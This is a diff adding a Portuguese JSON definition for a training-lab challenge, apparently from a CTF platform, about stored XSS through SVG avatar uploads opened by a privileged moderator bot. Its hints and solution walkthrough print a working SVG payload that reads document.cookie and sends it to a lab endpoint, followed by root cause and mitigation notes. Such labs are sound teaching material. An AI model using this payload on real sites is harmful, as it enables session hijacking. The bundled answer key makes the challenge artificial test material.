@@ -1,0 +1,81 @@
+{
+  "slug": "upload-svg-avatar",
+  "title": "Arte com instruções",
+  "codename": "AVATAR DOCK",
+  "summary": "O Avatar Dock aceita uploads de SVG e os serve inline com um content type de imagem. O bot de moderação abre assets enviados diretamente enquanto carrega um cookie privilegiado legível. Envie conteúdo ativo e capture-o.",
+  "category": "upload",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "upload-svg-avatar",
+  "estimated_minutes": 25,
+  "xp": 165,
+  "tech": [
+    "Flask",
+    "SVG",
+    "File upload",
+    "Selenium bot"
+  ],
+  "tags": [
+    "file-upload",
+    "svg",
+    "stored-xss"
+  ],
+  "story": "O Avatar Dock valida a extensão, armazena o arquivo e o serve de volta como `image/svg+xml`. O bot de moderação abre cada asset como documento de nível superior, o que executa script SVG. O cookie de sessão do bot é legível para este exercício.",
+  "objective": "Envie um SVG que exfiltre cookies, direcione o bot moderador para o path do asset e submeta a flag capturada.",
+  "rules": "O bot só abre paths deste lab. Envie apenas arquivos que você criar para este exercício.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Cookie do moderador",
+      "flag_type": "user",
+      "points": 165,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "SVG é XML",
+      "body": "Um documento SVG pode conter elementos `<script>` e event handlers. O servidor o serve como `image/svg+xml`, então uma visita direta o renderiza como documento em vez de imagem passiva em uma tag `<img>`.",
+      "cost": 15
+    },
+    {
+      "level": 2,
+      "title": "Envie o payload",
+      "body": "Crie `poc.svg` com `<svg xmlns=\"http://www.w3.org/2000/svg\"><script>fetch('/collect?c='+encodeURIComponent(document.cookie))</script></svg>` e envie. Anote a URL `/avatar/<name>.svg` retornada.",
+      "cost": 20
+    },
+    {
+      "level": 3,
+      "title": "Peça ao moderador",
+      "body": "Submeta o path do asset em `/report`. O moderador o abre com `admin_session` definido. Leia `/captured` e submeta o valor do cookie; o objetivo é registrado por `/collect`.",
+      "cost": 30
+    }
+  ],
+  "solution": {
+    "walkthrough": "1. Crie o arquivo `poc.svg`:\n```xml\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"300\" height=\"120\">\n  <rect width=\"100%\" height=\"100%\" fill=\"#111\"/>\n  <script>fetch('/collect?c='+encodeURIComponent(document.cookie))</script>\n</svg>\n```\n2. Envie-o em `/` e copie o path `/avatar/<name>.svg` resultante.\n3. Submeta esse path em `/report`.\n4. Abra `/captured`; o cookie `admin_session` do moderador contém a flag. Submeta-a.",
+    "root_cause": "Upload irrestrito de arquivo ativo combinado com serving de conteúdo inline. A checagem de extensão não prova a segurança do conteúdo, e servir SVG como documento permite execução de script na origem da aplicação. O moderador privilegiado visita o arquivo.",
+    "mitigation": "Rejeite SVG ativo ou sanitize-o; sirva arquivos não confiáveis a partir de uma origem separada com `Content-Disposition: attachment` e uma CSP restritiva; inspecione content type e magic bytes; nunca abra uploads de usuário em um navegador privilegiado; use cookies `HttpOnly` com escopo e isole a infraestrutura de moderação."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — File upload vulnerabilities",
+      "url": "https://portswigger.net/web-security/file-upload",
+      "source_type": "official",
+      "description": "Falhas de validação de upload e tipos de arquivo ativos."
+    },
+    {
+      "title": "OWASP File Upload Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Controles de validação de conteúdo, armazenamento e serving."
+    },
+    {
+      "title": "OWASP — XSS via SVG upload",
+      "url": "https://owasp.org/www-community/attacks/xss/",
+      "source_type": "standard",
+      "description": "Por que SVG deve ser tratado como conteúdo ativo."
+    }
+  ]
+}
